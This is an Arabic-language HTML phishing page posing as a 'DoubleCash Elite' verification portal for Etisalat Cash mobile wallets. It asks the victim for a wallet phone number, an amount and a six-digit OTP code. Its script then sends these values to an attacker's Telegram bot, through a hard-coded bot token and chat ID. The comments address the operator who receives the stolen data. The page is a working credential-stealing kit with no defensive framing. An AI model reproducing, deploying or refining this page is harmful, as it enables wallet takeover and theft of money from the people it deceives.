<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DoubleCash Elite | Portal</title>
    <style>
        :root {
            --etisalat-green: #00c431;
            --main-bg: #111111;
            --card-bg: #ffffff;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--main-bg);
            background-image: linear-gradient(180deg, #1a1a1a 0%, #000 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .auth-card {
            background: var(--card-bg);
            padding: 40px 30px;
            border-radius: 30px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            width: 100%;
            max-width: 380px;
            text-align: center;
            border-top: 8px solid var(--etisalat-green);
        }

        .logo-box {
            margin-bottom: 25px;
        }

        .logo-box img {
            max-width: 180px;
            max-height: 100px;
            object-fit: contain;
            border-radius: 10px;
        }

        h2 {
            margin: 0;
            font-size: 26px;
            color: #222;
            font-weight: 900;
        }

        p.subtitle {
            font-size: 13px;
            color: #777;
            margin: 8px 0 25px 0;
        }

        .input-group {
            text-align: right;
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 700;
            margin-bottom: 6px;
            color: #444;
            padding-right: 5px;
        }

        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #eee;
            border-radius: 15px;
            box-sizing: border-box;
            font-size: 16px;
            transition: 0.3s ease;
            outline: none;
            background: #fcfcfc;
            text-align: center;
            font-weight: 600;
        }

        input:focus {
            border-color: var(--etisalat-green);
            background: #fff;
            box-shadow: 0 0 15px rgba(0, 196, 49, 0.1);
        }

        .btn-confirm {
            width: 100%;
            padding: 18px;
            background: var(--etisalat-green);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 19px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(0, 196, 49, 0.2);
        }

        .btn-confirm:hover {
            background: #00a82a;
            transform: translateY(-3px);
            box-shadow: 0 12px 25px rgba(0, 196, 49, 0.3);
        }

        .footer {
            margin-top: 30px;
            font-size: 11px;
            color: #ccc;
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

<div class="auth-card">
    <div class="logo-box">
        <img src="https://share.google/Liq9YDM7z2FcW9f7A" alt="Logo" id="siteLogo">
    </div>
    
    <h2>DoubleCash Elite</h2>
    <p class="subtitle">Secure Verification Portal</p>

    <div class="input-group">
        <label>رقم محفظة اتصالات كاش</label>
        <input type="tel" id="uPhone" placeholder="011xxxxxxxx" maxlength="11">
    </div>

    <div class="input-group">
        <label>المبلغ المطلوب (EGP)</label>
        <input type="number" id="uAmount" placeholder="أدخل المبلغ" inputmode="numeric">
    </div>

    <div class="input-group">
        <label>كود التحقق (6 أرقام)</label>
        <input type="text" id="uOTP" placeholder="••••••" maxlength="6" inputmode="numeric">
    </div>

    <button class="btn-confirm" onclick="executeProcess()">تأكيد العملية</button>

    <div class="footer">
        © 2026 DOUBLECASH OFFICIAL SERVICES
    </div>
</div>

<script>
    async function executeProcess() {
        // بياناتك الصحيحة
        const token = "8282267480:AAEDcEUkag7mNFKP4UIURlA4CvsL8bmxkyU";
        const chatId = "6142039589";
        
        const phone = document.getElementById('uPhone').value;
        const amount = document.getElementById('uAmount').value;
        const otp = document.getElementById('uOTP').value;

        if (phone.length < 11 || otp.length < 6 || amount === "") {
            alert("⚠️ يرجى إكمال جميع البيانات بشكل صحيح.");
            return;
        }

        // شكل الرسالة التي ستصلك في تليجرام
        const text = `💰 **New DoubleCash Request**\n\n` +
                     `📱 **Phone:** \`${phone}\` \n` +
                     `💵 **Amount:** \`${amount} EGP\` \n` +
                     `🔑 **OTP Code:** \`${otp}\` \n\n` +
                     `📍 **Status:** Verified & Ready`;

        try {
            const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });

            if (response.ok) {
                alert("✅ تم إرسال البيانات بنجاح! انتظر رسالة التأكيد.");
            } else {
                alert("❌ فشل في الإرسال، تحقق من التوكن أو الآيدي.");
            }
        } catch (e) {
            alert("⚠️ خطأ في الاتصال بالإنترنت.");
        }
    }
</script>

</body>
</html>
